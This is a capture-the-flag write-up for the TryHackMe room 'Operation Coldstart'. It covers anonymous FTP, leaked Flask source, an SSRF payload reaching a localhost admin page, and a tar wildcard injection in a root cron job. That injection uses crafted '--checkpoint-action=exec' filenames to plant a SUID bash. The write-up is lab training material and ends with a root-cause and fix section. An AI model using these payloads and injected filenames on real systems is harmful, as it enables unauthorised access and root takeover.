# Operation Coldstart

Room: https://tryhackme.com/room/operationcoldstart

Wake up the staging server everyone left behind.

Volt Labs, a small shop, suspects an old staging server has rotted into an exposed liability. Mara has assigned you the engagement. Find your way in and demonstrate full compromise.

Start the by clicking the Start Machine button at the top right of the task. You can complete the challenge by connecting through or the AttackBox, which contains all the essential tools.

Allow two to three minutes for all services to start.

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/jr-penetration-tester/operationcoldstart.md

---

## Overview

Coldstart exposed three services:

```text
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    gunicorn
```

The attack path was:

```text
Anonymous FTP access
Leaked Flask application backup
Source code review
SSRF via trusted internal hostname
Internal admin notes disclosure
SSH as webdev
User flag
Writable backup directory
Root cron job using unsafe tar wildcard
Tar option injection
Root shell
Root flag
```

---

## Enumeration

Initial service enumeration showed FTP, SSH, and a Gunicorn powered web application.

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http    gunicorn
```

The web service displayed a Volt Labs URL preview application.

The page allowed a user to submit a URL to `/preview` using the `url` parameter.

Example:

```text
http://10.66.147.116/preview?url=http://example.com
```

Because the application appeared to fetch URLs server side, SSRF was an early area of interest.

---

## Anonymous FTP Access

FTP allowed anonymous login.

```bash
ftp 10.66.173.197
```

```text
Connected to 10.66.173.197.
220 (vsFTPd 3.0.5)
Name (10.66.173.197:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Listing the FTP root showed a `pub` directory.

```text
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 09 23:14 pub
226 Directory send OK.
```

Inside `pub`, there was a backup archive.

```text
ftp> cd pub
250 Directory successfully changed.

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 09 23:14 .
drwxr-xr-x    3 ftp      ftp          4096 May 09 23:14 ..
-rw-r--r--    1 ftp      ftp          2446 May 09 23:14 backup.tar.gz
226 Directory send OK.
```

The backup was downloaded.

```text
ftp> get backup.tar.gz
local: backup.tar.gz remote: backup.tar.gz
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup.tar.gz (2446 bytes).
226 Transfer complete.
2446 bytes received in 0.00 secs (4.8296 MB/s)
```

---

## Extracting the Backup

The archive was extracted locally.

```bash
mkdir backup
tar -xvzf backup.tar.gz -C backup
```

```text
voltlabs-preview/
voltlabs-preview/requirements.txt
voltlabs-preview/README.md
voltlabs-preview/app.py
```

The extracted application contained:

```text
app.py
README.md
requirements.txt
```

The requirements showed a small Flask application running with Gunicorn.

```bash
cat requirements.txt
```

```text
flask
requests
gunicorn
```

---

## Reviewing the Flask Source Code

The main application logic was in `app.py`.

The important section was the `/preview` route.

```python
ALLOWED_HOSTS = {"kestrel.thm"}
```

The source code comment revealed that `kestrel.thm` resolved to localhost on the target.

```python
# Only requests targeting an approved internal hostname are forwarded.
# Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.
ALLOWED_HOSTS = {"kestrel.thm"}
```

The preview function only checked the hostname.

```python
host = (urlparse(target).hostname or "").lower()
if host not in ALLOWED_HOSTS:
    return page("Preview Blocked",
                '<div class="card"><p>Host not in the approved internal allow-list.</p></div>'), 403
```

It did not restrict the path.

After passing the hostname check, the application fetched the supplied URL server side.

```python
r = requests.get(target, timeout=3)
```

There was also an internal admin route.

```python
@app.route("/admin/")
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
    return "<pre>Volt Labs admin endpoint.</pre>"
```

This meant direct access to `/admin/notes` would be blocked unless the request came from localhost.

However, the `/preview` endpoint could be used to make the server request the admin route from itself.

---

## SSRF to Internal Admin Notes

Directly using `localhost` would not pass the allow-list, because the only allowed hostname was:

```text
kestrel.thm
```

The working SSRF payload was:

```text
http://10.66.147.116/preview?url=http://kestrel.thm/admin/notes
```

This caused the server to fetch:

```text
http://kestrel.thm/admin/notes
```

From the target's perspective, `kestrel.thm` resolved to `127.0.0.1`, so the admin route allowed the request.

The response disclosed SSH credentials.

```text
Preview of http://kestrel.thm/admin/notes

<pre>=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: [REDACTED]
- Mara
</pre>
```

---

## SSH Access as webdev

The leaked credentials were used to log in over SSH.

```bash
ssh webdev@10.66.147.116
```

After logging in, the user flag was available in the home directory.

```bash
cat user.txt
```

```text
THM{REDACTED}
```

---

## Privilege Escalation Enumeration

Basic writable file enumeration showed an interesting writable location under `/opt/backups`.

```bash
find / -writable -type f 2>/dev/null | grep -v '/proc' | grep -v '/sys' | head -50
```

```text
/opt/backups/.keep
/home/webdev/.profile
/home/webdev/.bashrc
/home/webdev/.cache/motd.legal-displayed
/home/webdev/user.txt
/home/webdev/.bash_logout
```

This suggested a backup related privilege escalation path.

Searching for references to `/opt/backups` found a root cron job.

```bash
grep -Rni "/opt/backups" /etc 2>/dev/null
```

```text
/etc/cron.d/voltlabs-backup:5:* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

The cron job ran every minute as root.

```text
* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

---

## Vulnerable Cron Job

The vulnerability was caused by this command:

```bash
cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

The issue is the final wildcard:

```bash
*
```

Because `webdev` could create files inside `/opt/backups`, it was possible to create filenames that looked like command-line options.

When the shell expands `*`, those filenames are passed to `tar`.

GNU tar supports checkpoint actions, including executing a command.

By creating malicious filenames, `tar` could be tricked into executing a script as root.

---

## Tar Wildcard Injection

A payload script was created inside `/opt/backups`.

```bash
cd /opt/backups
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > shell.sh
chmod +x shell.sh
```

Then two malicious filenames were created.

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

The directory then contained:

```text
'--checkpoint-action=exec=sh shell.sh'  '--checkpoint=1'   shell.sh
```

When cron ran the backup command, the wildcard expanded into these filenames.

The command effectively became similar to:

```bash
tar czf /var/backups/uploads.tgz --checkpoint-action=exec=sh shell.sh --checkpoint=1 shell.sh
```

`tar` interpreted the malicious filenames as options and executed:

```bash
sh shell.sh
```

Because cron ran as root, the script executed as root and created a SUID copy of bash.

---

## Root Shell

After waiting for the cron job to run, `/tmp/rootbash` appeared.

```bash
ls -la /tmp/rootbash
```

```text
-rwsr-xr-x 1 root root 1446024 May 25 10:24 /tmp/rootbash
```

The SUID bash binary was executed with `-p` to preserve effective root privileges.

```bash
/tmp/rootbash -p
```

```text
rootbash-5.2#
```

The root flag was then read.

```bash
cd /root
ls
cat flag.txt
```

```text
flag.txt  snap
THM{REDACTED}
```

---

## Root Cause Summary

There were two main vulnerabilities.

### 1. Source Code and Credential Disclosure

Anonymous FTP exposed a backup of the web application.

That backup revealed:

- the allowed internal hostname
- the SSRF logic
- the protected admin route
- the location of internal notes

### 2. Unsafe Root Backup Cron Job

A root cron job ran `tar` with a wildcard in a directory writable by a low-privilege user.

```bash
cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

This allowed tar option injection through filenames.

A safer version would avoid unsafe wildcard expansion in a writable directory.

For example:

```bash
tar czf /var/backups/uploads.tgz -- ./*
```

Even better, low-privilege users should not be able to write to the directory being processed by a root backup job.

---

## Final Attack Chain

```text
1. Enumerated FTP, SSH, and HTTP
2. Logged into FTP anonymously
3. Downloaded backup.tar.gz
4. Extracted Flask source code
5. Found allowed hostname kestrel.thm
6. Found localhost-only /admin/notes route
7. Used SSRF through /preview
8. Retrieved SSH credentials for webdev
9. Logged in over SSH
10. Read user flag
11. Found writable /opt/backups
12. Found root cron job using tar with *
13. Created tar checkpoint option filenames
14. Executed root payload through cron
15. Created SUID bash
16. Used /tmp/rootbash -p for root shell
17. Read root flag
```
